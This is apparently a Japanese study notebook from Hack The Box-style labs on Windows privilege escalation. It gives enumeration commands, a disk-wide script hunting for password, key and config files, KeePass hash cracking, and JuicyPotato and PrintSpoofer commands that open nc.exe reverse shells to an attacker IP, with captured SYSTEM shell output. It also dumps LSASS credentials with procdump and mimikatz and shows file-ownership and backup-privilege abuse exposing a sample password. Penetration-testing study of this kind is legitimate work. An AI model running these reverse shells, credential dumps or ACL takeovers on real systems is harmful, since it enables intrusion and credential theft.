# 状況認識と初期列挙

**ユーザー名とホスト名**

```
whoami /all
hostname
```

**現在のユーザーのグループメンバーシップと権限**
```
whoami /groups
```

**既存のユーザーとグループ**
- net user <ユーザー名>で、そのユーザーが属しているグループがわかる
	- Remote Management Users : winrm
	- Remote Desktop Users : rdp
```
net user
Get-LocalUser
net localgroup
```

特定グループの詳細確認（標準外のグループや構成ミスの発見に有用）

```
net localgroup administrators
```

**オペレーティングシステム、バージョン、アーキテクチャ**

```
systeminfo
```

**パッチと更新**

CMD

```
wmic qfe
```


```
Get-HotFix | ft -AutoSize
```

**パスワードポリシーおよびアカウント情報**

```
net accounts
```

## ネットワーク情報

**基本的なネットワーク設定**

```
ipconfig /all
```

**ARPテーブル**

```
arp -a
```

**ルーティングテーブル**

```
route print
```

**アクティブなネットワーク接続**

- ローカルホストでのみアクセス可能な脆弱なサービスの発見に有用
- ループバックアドレス（127.0.0.1および::1）でリッスンしているエントリに注目

```
netstat -ano
```

主なサービス例：

- FileZilla管理インターフェイス（ポート14147）
- Splunk Universal Forwarder
- Erlang（ポート25672）- SolarWinds、RabbitMQ、CouchDBなど

## インストールされているアプリケーションとプロセス

**インストールされているプログラム**

32ビットアプリケーション
- select displaynameを外すと、詳細情報を取得できる
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

> 一般的な特筆すべきでない出力
```sh
displayname
-----------

Microsoft Edge
Microsoft Edge Update
Microsoft Edge WebView2 Runtime

Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.29.30133
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30133
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133

```

64ビットアプリケーション

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

> 一般的な特筆すべきでない出力
```sh
displayname
-----------


Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.29.30133
VMware Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.29.30133

```

WMIを使用

```
wmic product get name
Get-WmiObject -Class Win32_Product | select Name, Version
```

**実行中のプロセス**

```
Get-Process
tasklist /svc
```

**PIDで実行中のサービス検索**

CMD（管理者権限）

```
sc queryex type= service | findstr /C:"PID" /C:"SERVICE_NAME"
```

PowerShell

```
Get-WmiObject Win32_Service | Where-Object { $_.ProcessId -eq <PID> } | Select-Object Name, DisplayName, ProcessId
```

**ログインユーザー**

```
query user
query session
```

## セキュリティ設定

**Windows Defenderのステータス**

```
Get-MpComputerStatus
```

**AppLockerルール**

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**AppLockerポリシーのテスト**

```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

## 環境変数とパス

**すべての環境変数の表示**

- PATHの構成ミス（書き込み可能なフォルダがPATHに含まれている場合、DLLインジェクションの可能性）
- カスタムパスがC:\Windows\System32より左側にある場合は特に危険

```
$env:Path.Split(';')
```

**現在のユーザーで書き込めるフォルダの検索**

```
for /d /r %i in (*) do @icacls "%i" 2>nul | findstr /i ":(F) :(M) :(W)" && echo %i
```

## 名前付きパイプの列挙

**Sysinternals PipeListを使用**

```
pipelist.exe /accepteula
```

**PowerShellを使用**

```
gci \\.\pipe\
```

**名前付きパイプの権限確認**

```
./accesschk.exe /accepteula \\.\Pipe\lsass -v
```

書き込みアクセスを許可するすべての名前付きパイプを検索

```
accesschk.exe -w \pipe* -v
```


# Credential Hunting
パスワードは再利用されることが多いので、パスワードが見つかったら、すべてのユーザーまたはサービスに対して必ずパスワードを試す必要がある

## Password Managerの探索
KeePassファイルが含まれていないかを確認する
```sh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

John The Ripperの`keepass2ohn`を使って、ハッシュの形にできる
keepass2johnを使ってKeePassデータベースをHashcat用にフォーマットする
```sh
keepass2john Database.kdbx > keepass.hash
```

これをhashcatで辞書攻撃するためには、ファイル文頭の`Database:`を削除すれば良い
- -m 13400で辞書攻撃する
```sh
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### XAMPPの設定ファイル
- my.iniは MySQLの設定ファイル
- passwords.txtにはXAMPPの各コンポーネントのデフォルトパスワード
```sh
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

### その他設定ファイル
ホームディレクトリ内
- まあ、dir -Rでいいんじゃないかと思うけど
```sh
Get-ChildItem -Path C:\Users\emma\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```sh
# 隠しファイル・フォルダを含めて表示
dir -Force

# 再帰的に表示
dir -Force -Recurse

# エイリアス
ls -Force
Get-ChildItem -Force
```

```sh
# 隠しファイル・フォルダのみ
dir -Attributes Hidden

# 隠し以外
dir -Attributes !Hidden

# 隠し+システムファイル
dir -Attributes Hidden,System
```

実行ポリシーの変更（必要な場合）
```sh
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

スクリプト
```sh
Write-Host "=== 設定ファイルとセンシティブファイルの検索 ===" -ForegroundColor Cyan; $extensions = @("*.conf", "*.config", "*.cnf", "*.ini", "*.inc", "*.inc.php", "*.env", "*.yml", "*.yaml", "*.json", "*.xml", "config.php", "config.inc.php", "settings.php", "wp-config.php", ".htpasswd", ".htaccess", "docker-compose.yml", "credentials", "id_rsa", "id_dsa", "authorized_keys", "shadow", "passwd", "*password*", "*secret*", "*credential*", "*token*", "*auth*", "*.bak", "*.old", "*.save"); $excludePatterns = @("\\Windows\\", "\\Program Files\\", "\\Program Files (x86)\\", "\\AppData\\Local\\Temp\\", "\\Windows\\Temp\\", "\\$Recycle.Bin\\", "\\System Volume Information\\", "\\ProgramData\\Package Cache\\", "\\WindowsApps\\", "node_modules\\", "\\.git\\", "\\cache\\", "\\fonts\\", "\\locale\\"); $searchPaths = @("C:\"); foreach ($path in $searchPaths) { Write-Host "`n検索中: $path" -ForegroundColor Yellow; foreach ($ext in $extensions) { try { $files = Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue -File | Where-Object { $exclude = $false; foreach ($pattern in $excludePatterns) { if ($_.FullName -like "*$pattern*") { $exclude = $true; break } }; -not $exclude }; foreach ($file in $files) { Write-Host $file.FullName -ForegroundColor Green } } catch { } } }; Write-Host "`n=== .cnfファイル内のユーザー/パスワード情報 ===" -ForegroundColor Cyan; $cnfFiles = Get-ChildItem -Path "C:\" -Filter "*.cnf" -Recurse -ErrorAction SilentlyContinue -File | Where-Object { $exclude = $false; foreach ($pattern in $excludePatterns) { if ($_.FullName -like "*$pattern*") { $exclude = $true; break } }; -not $exclude }; foreach ($file in $cnfFiles) { Write-Host "`nFile: $($file.FullName)" -ForegroundColor Yellow; try { $content = Get-Content $file.FullName -ErrorAction SilentlyContinue; $matches = $content | Select-String -Pattern "user|password|pass" -AllMatches | Where-Object { $_ -notmatch "^\s*#" -and $_ -notmatch "^\s*;" }; foreach ($match in $matches) { Write-Host $match.Line -ForegroundColor White } } catch { Write-Host "読み取りエラー: $_" -ForegroundColor Red } }; Write-Host "`n=== データベースファイルの検索 ===" -ForegroundColor Cyan; $dbExtensions = @(".sql", ".db", ".sqlite", ".sqlite3", ".db3", ".mdb", ".accdb", ".dbf"); foreach ($ext in $dbExtensions) { Write-Host "`nDB File extension: $ext" -ForegroundColor Yellow; try { $dbFiles = Get-ChildItem -Path "C:\" -Filter "*$ext" -Recurse -ErrorAction SilentlyContinue -File | Where-Object { $exclude = $false; foreach ($pattern in $excludePatterns) { if ($_.FullName -like "*$pattern*") { $exclude = $true; break } }; -not $exclude }; foreach ($file in $dbFiles) { Write-Host $file.FullName -ForegroundColor Green } } catch { } }; Write-Host "`n=== 検索完了 ===" -ForegroundColor Cyan
```

## Runas
- GUIにアクセスできる時のみ使用できる
- 別のユーザーとしてプログラムを実行できる

backupadminとしてPowerShellを実行する様子
```sh
runas /user:backupadmin cmd
```

## In Powershell

**Powershellの履歴取得**
```sh
Get-History
```

Clear-Historyコマンドを実行しても消えない
```sh
(Get-PSReadlineOption).HistorySavePath
```

**PowerShellのScript Block Loggingのイベントログを検索**
TaskViewerでここの中のEvent ID 4104を探すのもあり
```
Event Viewer
└── Applications and Services Logs
    └── Microsoft
        └── Windows
            └── PowerShell
                └── Operational
```

Powershellで検索するなら
```sh
# message内にcredかpasswordがあった場合のみ
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object -Property Message | Select-String -Pattern "password|cred"

# より包括的に見ることができる
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | 
  Format-List -Property *
```


# 自動列挙
```sh
# 色付きで見る方法
.\winPEASx64.exe ansi > winpeas_ansi.txt

# PowerUpで脆弱性スキャン
. .\PowerUp.ps1
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Invoke-AllChecks
```

**WinPEASのチェックリスト**
□ Scheduled Tasks (Administrator権限)
□ System Environment Variables
	- [[192.168.223.248#WinPEAS.exe (再)]]
□ Unquoted Service Paths
□ Writable Service Binaries
□ Writable Service Directories
□ AlwaysInstallElevated
□ Autologon Credentials
□ Saved Credentials
□ Registry Passwords
□ Weak Service Permissions
□ DLL Hijacking
□ Kernel Exploits

**この見出しを見たら100%精読**
"Scheduled Applications"
"Modifiable Services"
"Autorun Applications"
"Looking for Autologon credentials"
"Checking AlwaysInstallElevated"
"DPAPI Credential Files"
"Saved RDP connections"

# Windowsユーザー権限
権限昇格に役立つ Windows グループ
- 以下のグループのメンバーは、特別な権利や特権を持ち、権限昇格に利用される可能性がある。

| グループ                       | 説明                                                                                                                                                                                                                                                                                                                                               |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| デフォルトの管理者             | Domain Admins, Enterprise Admins (ドメイン/エンタープライズ全体を制御する "スーパー" グループ)                                                                                                                                                                                                                                                           |
| サーバーオペレーター             | サービス変更、SMB共有アクセス、ファイルバックアップが可能                                                                                                                                                                                                                                                                                                  |
| バックアップオペレーター           | DCへのローカルログオンが許可され、SAM/NTDSデータベースのシャドウコピー作成、レジストリのリモート読み取り、SMB経由のファイルシステムアクセスが可能（ドメイン管理者と見なす必要がある）                                                                                                                                                                          |
| 印刷オペレーター               | DCへのローカルログオンが可能で、悪意のあるドライバーをロードさせることが可能                                                                                                                                                                                                                                                                                   |
| Hyper-V 管理者               | 仮想DC環境の場合、仮想化管理者 (Hyper-V管理者など) はドメイン管理者と見なす必要がある                                                                                                                                                                                                                                                                  |
| アカウントオペレーター             | ドメイン内の保護されていないアカウントとグループの変更が可能                                                                                                                                                                                                                                                                                            |
| リモートデスクトップユーザー        | デフォルトでは有用な権限は少ないが、リモートデスクトップサービス経由のログオンを許可する権限が付与されている場合があり、RDPプロトコルで水平展開が可能                                                                                                                                                                                              |
| リモート管理ユーザー             | PSRemotingを使用してDCにログオン可能                                                                                                                                                                                                                                                                                                               |
| グループポリシークリエーター所有者 | 新しいGPOの作成が可能だが、GPOをドメインやOUにリンクするには追加の権限委任が必要                                                                                                                                                                                                                                                                           |
| スキーマ管理者                 | Active Directoryスキーマ構造の変更や、悪意のあるアカウントをデフォルトオブジェクトACLに追加することで、作成されるグループ/GPOをバックドア化することが可能                                                                                                                                                                                              |
| DNS 管理者                    | DCにDLLをロードできるが、DNSサーバーを再起動する権限はない。永続化メカニズムとして悪意のあるDLLをロードし、再起動を待機できる。                                                                                                                                                                                                                                  |

## 一般的なユーザーが持つ権限
- **SeChangeNotifyPrivilege**
	- Bypass traverse checking (トラバースチェックのバイパス): この権限は、ユーザーがディレクトリ構造をトラバース (移動) する際に、アクセス権限をバイパスすることを許可します。 これは、たとえユーザーが特定のディレクトリへのアクセス権を持っていなくても、そのディレクトリ内のファイルやフォルダをリストできることを意味します。
- **SeIncreaseWorkingSetPrivilege**
	- Increase a process working set (プロセスのワーキングセットの増加): この権限は、プロセスに割り当てられるメモリの量を増やすことを許可します。 一般的なユーザーにはデフォルトで割り当てられていますが、悪用される可能性は比較的低いと考えられています。

以下の権限があったら、権限昇格に悪用可能
- **SeImpersonatePrivilege** : 
- **SeBackupPrivilege:** バックアップ操作の実行を許可
- **SeRestorePrivilege:** リストア操作の実行を許可
- **SeDebugPrivilege:** プロセスのデバッグを許可
- **SeTakeOwnershipPrivilege:** ファイルまたは他のオブジェクトの所有権を取得することを許可

## SeImpersonate と SeAssignPrimaryToken
| 特権名                      | 主な機能                  | 権限昇格の手段                | 実用ツール例                     |
| ------------------------ | --------------------- | ---------------------- | -------------------------- |
| `SeImpersonatePrivilege` | 他のユーザーのセッションを偽装して操作可能 | 偽装セッション経由でのSYSTEM権限奪取  | Juicy Potato, PrintSpoofer |
| `SeAssignPrimaryToken`   | 任意のトークンを使ってプロセスを起動可能  | SYSTEMのトークンを用いた新プロセス作成 | Token tactics, runas abuse |
WindowsトークンとSeImpersonatePrivilegeの基本
- Windowsでは、すべてのプロセスに「アクセストークン」が付与されている
	- アクセストークンは、そのプロセスを実行しているユーザーの情報を含む
	- ただし、トークンは安全なリソースではなく、メモリ上に存在するため悪用されうる

SeImpersonatePrivilege（偽装権限）
- 他のプロセスのトークンを「偽装」して使用できる特権
	- 通常、管理者アカウントにのみ与えられる
	- `CreateProcessWithTokenW`などのAPIで利用される
	- システム強化中に無効化・削除されることがある

正当な利用ケース
- 一部の正規プログラムがこの特権を使って権限昇格を行う
	- 例：WinLogonプロセスからSYSTEMトークンを取得し、自プロセスをSYSTEMとして実行する

 悪用ケース（ポテト系攻撃）
- 攻撃者がSeImpersonateを利用してSYSTEMトークンを盗用し、権限昇格
	- ポテトスタイル（例：Juicy Potato, PrintSpoofer）は、トークンを渡してくれるSYSTEMプロセスに接続させる手法
	- SYSTEMで動作している別プロセスを「騙して」トークンを奪う

 どんなときに狙えるか？
- サービスアカウントのコンテキストで動作している場合に遭遇しやすい
	- 例：ASP.NETのWebシェル、Jenkins経由のRCE、MSSQL経由のコマンド実行
	- これらのケースではSeImpersonateを持っていることが多く、昇格のチャンスがある

 攻撃時のチェックポイント
- サービスアカウントやRCEの初期シェルを得たら、最初に `whoami /priv` でSeImpersonateの有無を確認
	- もしあるなら、それは「簡単な特権昇格の入り口」になりうる

### JuicyPotato
- JuicyPotato は、Windows Server 2019 および Windows 10 build 1809(17763) 以降では機能しない
	- バージョンは、`systeminfo`で確認できる
- まずJuicyPotato.exeバイナリをダウンロードし、これとnc.exeをターゲットサーバーにアップロードする
- JuicyPotato.exeのオプション
	- -l : COMサーバーのリスニングポート
	- -p : 起動するプログラム（cmd.exe）
	- -a : cmd.exeに渡される引数
	- -t : createprocess呼び出し

**ユーザー権限の確認**
- SeImpersonatePrivilege権限があるかどうかを確認

**JuicyPotato.exe・nc.exeのダウンロード**
```sh
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```sh
wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
```

**JuicyPotatoの実行**
- CreateProcessWithTokenW関数とCreateProcessAsUser関数の両方を試すようにツールに指示している
	- これらの関数には、それぞれSeImpersonateまたはSeAssignPrimaryToken特権が必要
```shell-session
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
       
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                          
```

**SYSTEMシェルのキャッチ**
```shell-session
snowyowl644@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### PrintSpoofer と RoguePotato
- JuicyPotato は、Windows Server 2019 および Windows 10 build 1809 以降では機能しない
- PrintSpoofer と RoguePotato を使用すると、同じ特権を活用して、NT AUTHORITY\SYSTEM レベルのアクセス権を取得できる

**PrintSpoofer を使用した特権の昇格**
```sh
wget https://github.com/dievus/printspoofer/raw/refs/heads/master/PrintSpoofer.exe
```

```shell-session
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK           
```

**SYSTEM としてのリバースシェルのキャッチ**
```shell-session
snowyowl644@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

## SeDebugPrivilege
- SeTakeOwnershipPrivilege : 所有権の取得特権
- この特権は、[コンピューター設定] > [Windows 設定] > [セキュリティ設定] のローカルまたはドメイングループポリシーを介して割り当てることができる
	- デフォルトでは、管理者のみがこの特権を許可される
- システムメモリから機密情報をキャプチャしたり、カーネルおよびアプリケーション構造にアクセス/変更したりするために使用できる
- ユーザー権利は、割り当てられたすべてのアカウントが重要なオペレーティングシステムのコンポーネントにアクセスできるようになるため、控えめに与える必要がある

Debug プログラムの権利が割り当てられたユーザーとしてログオンし、昇格されたシェルを開くと、SeDebugPrivilege がリストされていることがわかる
```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

**認証情報のダンプ**
- SysInternals スイートの ProcDump を使用して、この特権を活用し、プロセスメモリをダンプできる
	- 有力な候補は、ユーザーがシステムにログオンした後にユーザー認証情報を保存するローカルセキュリティ認証サブシステムサービス (LSASS) プロセス
```cmd-session
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

- sekurlsa::minidump コマンドを使用して Mimikatz にロードできる
	- sekurlsa::logonPasswords コマンドを発行すると、ローカルでログオンしたローカル管理者アカウントの NTLM ハッシュが得られる
- mimikatzは、始まったらまず`log`と入力する
	- ログを保存できるから
```cmd-session
C:\htb> mimikatz.exe

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
```

RDP アクセス権がある場合は、タスクマネージャーを使用して LSASS プロセスの手動メモリダンプを作成できる
![](https://i.imgur.com/QxZwVi8.png)

**SYSTEM としてのリモートコード実行**
- SeDebugPrivilege を RCE にも活用できる
	-  子プロセスを起動し、SeDebugPrivilege を介してアカウントに付与された昇格された権利を使用して、通常のシステム動作を変更し、親プロセスのトークンを継承して偽装することで、特権を SYSTEM に昇格できる
	- SYSTEM として実行されている親プロセス (ターゲットプロセスのプロセス ID (PID) を指定するか、実行中のプログラム) をターゲットにする場合、権限をすばやく昇格させることができる

まず、 PoC スクリプトをターゲットシステムに転送する
- https://github.com/decoder-it/psgetsystem
```sh
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1
```

次に、スクリプトをロードする
```
PS> . .\psgetsys.ps1 

PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

管理者特権の PowerShell コンソールを開く
- tasklist と入力して、実行中のプロセスと付属の PID のリストを取得する
	- Windows ホストで SYSTEM として実行されていることがわかっている PID 612 で実行されている winlogon.exe をターゲットにできる
```powershell-session
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
winlogon.exe                   612 Console                    1     10,408 K
```

Get-Process コマンドレットを使用して、SYSTEM として実行される既知のプロセス (LSASS など) の PID を取得し、PID をスクリプトに直接渡すこともできる

## SeTakeOwnershipPrivilege
SeTakeOwnershipPrivilege（所有権の取得）
- ユーザーに「セキュリティ保護可能なオブジェクト」の所有権を取得する権限を付与
	- 対象: Active Directory オブジェクト、NTFS ファイル/フォルダー、プリンター、レジストリキー、サービス、プロセスなど
- WRITE_OWNER 権限を通じて、オブジェクトのセキュリティ記述子の所有者を変更可能
- 標準ユーザーアカウントにこの特権が付与されていることは稀
	- 例: VSS スナップショットやバックアップ処理を担うサービスアカウントなど
- SeBackupPrivilege, SeRestorePrivilege, SeSecurityPrivilege と併用されることがあり、より細かな権限管理が可能
- 他の昇格手法がブロックされている状況下では、この特権単体でも権限昇格が可能
	- 特定のファイルやフォルダーの所有権を取得してアクセス権を変更することで活用できる
- Active Directory 環境では、この特権を悪用してファイル共有上の機密ファイルにアクセスされるリスクがある
- この特権はグループポリシーで管理される
	- パス: コンピューターの構成 → Windows の設定 → セキュリティの設定 → ローカルポリシー → ユーザー権利の割り当て
- ユーザーにこの特権が付与されている、または GPO 攻撃（例: SharpGPOAbuse）で取得した場合
	- パスワードや SSH キーなどが含まれるドキュメントや機密ファイルにアクセスできる可能性がある

**特権の活用**
現在のユーザー特権の確認
```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

SeTakeOwnershipPrivilege の有効化
```sh
PS C:\htb> wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

ターゲットファイルの選択
- **機密性:**
    - 認証情報 (パスワード、APIキー、暗号化キー)
    - 設定ファイル (データベース接続文字列、APIエンドポイント)
- **アクセス制御:**
    - アクセス制限が緩いファイル
    - SYSTEM アカウントのみアクセス可能なファイル
    - 現在のユーザーがアクセスできないファイル
- **入手経路:**
    - 共有フォルダ
    - Web サーバーのルートディレクトリ
    - ユーザーのプロファイルディレクトリ
- **攻撃目標との関連性:**
    - 認証情報を含むファイル
    - 設定ミスを悪用できるファイル
    - コード実行を可能にするファイル
- **ターゲットファイルの例:**
    - 設定ファイル: web.config, .env, settings.ini
    - パスワードファイル: passwords.txt, credentials.xml
    - データベースファイル: .kdbx (KeePass), .mdb, .accdb
    - SSH 秘密鍵ファイル: %USERPROFILE%\.ssh\id_rsa
- **攻撃可能性:**
    - 難読化されていないファイル
    - 既知の脆弱性が存在するソフトウェアの設定ファイル
- **実行可能性:**
    - コード実行可能なファイル

ターゲットファイルを確認して、詳細情報を収集する
```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

ファイル所有権の確認・取得
- 確認する
```powershell-session
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
```
上のコマンドで確認できなかったら打つコマンド
```powershell-session
PS C:\Tools> takeown /f 'C:\TakeOwn\flag.txt'
SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
```

所有権の変更の確認
```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

ファイル ACL の変更
- ファイル ACL を変更して読み取れるようにする必要がある場合は、まだファイルを読み取ることができないことがある
```powershell-session
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
その場合は、ターゲットファイルに対するフル権限をユーザーに付与する
```powershell-session
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

ファイルの読み取り
- コマンドラインからターゲットファイルを読み取ったり、RDPを接続できる、追加の処理のために攻撃システムにコピーしたりできます (KeePass データベースのパスワードをクラッキングするなど)。
	-  この権限の活用は破壊的なアクションと見なすことができ、細心の注意を払って行う必要がある
```powershell-session
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!
```

使うことができるファイル
```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
- 特権を昇格させたり、アクセスをさらに進めたりするために、機密情報を抽出するためにターゲットにできる .kdbx KeePass データベースファイル、OneNote ノートブック、`password.*`、`pass.*`、`creds.*`、スクリプト、その他の構成ファイル、仮想ハードドライブファイルなどにも遭遇する可能性がある

# Windowsグループ権限
## Windows組み込みグループ
注目すべきのwindows組み込みレポート
- [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)
- [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)
- [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)
- [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
- [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)
- [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

### Backup Operators
- [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)メンバーシップは、メンバーに SeBackup および SeRestore 特権を付与する
- SeBackupPrivilege を使用すると、任意のフォルダーをトラバースし、フォルダーの内容を一覧表示できる
	- これにより、フォルダーのアクセス制御リスト (ACL) に ACE (アクセス制御エントリ) がなくても、フォルダーからファイルをコピーできる
	- 代わりに、FILE_FLAG_BACKUP_SEMANTICS フラグを指定して、プログラムでデータをコピーする必要がある

以下のライブラリを使用して SeBackupPrivilege を悪用し、このファイルをコピーできる
```sh
wget https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeUtils.dll
wget https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeCmdLets.dll

```

```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

SeBackupPrivilege が有効になっていることの確認
- 無効になっている
	- 有効にするために、`Get-SeBackupPrivilege`を使える
```powershell-session
PS C:\htb> whoami /priv

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
```

SeBackupPrivilege の有効化
- 特権が無効になっている場合は、Set-SeBackupPrivilege で有効にできる
```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

保護されたファイルのコピー
- ここまでで、SeBackupPrivilegeが有効になるので、ACL をバイパスし、
-  必要な権限を持たずに機密情報にアクセスできた
```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

PS C:\htb>  cat .\Contract.txt
Inlanefreight 2021 Contract
```

#### NTDS.ditのコピー
- ドメインコントローラーへの攻撃
- ドメインコントローラーにローカルでログオンすることも許可される
